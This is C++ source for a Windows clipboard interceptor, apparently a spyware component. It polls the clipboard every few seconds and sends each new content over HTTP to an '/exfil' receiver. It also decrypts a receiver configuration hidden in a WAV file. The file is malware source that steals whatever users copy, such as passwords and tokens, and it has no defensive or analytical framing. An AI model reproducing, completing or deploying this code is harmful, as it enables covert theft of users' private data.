#include <iostream>
#include <windows.h>
#include <string>
#include <thread>

#include <clipboard.h>
#include <tools.h>
#include <httpexfil.h>
#include <wavcrypt.h>

// Console ouput UTF_16 format, TODO REMOVE
#include <fcntl.h>
#include <io.h>

void HandleNewData(std::string& data)
{    
    std::cout << "[*] New Clipboard Content:\n\n" << data << "\n\n";
    std::cout << "Sending data to receiver...\n";

    try
    {
        ExfiltrateClipboardHTTP(data, "127.0.0.1", "/exfil", 80);
    }
    catch(const std::exception& ex)
    {
        std::wcout << "Error when sending data to receiver: " << ex.what() << "\n";
    }
    catch(...)
    {
        std::wcout << "Unknown exception occured when sending data to receiver.\n";
    }
}

int main() {
    std::cout << "[*] Clipboard Interceptor Started\n";
    std::string lastClipboard = "";

    auto [host, port, path] = ExtractAndDecryptConfig("ouch.wav");

    while(true)
    {
        std::string currentClipboard = GetClipboardText();

        if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
        {
            HandleNewData(currentClipboard);  
            lastClipboard = currentClipboard;
        }

        std::this_thread::sleep_for(std::chrono::seconds(3));
    }

    return 0;
}
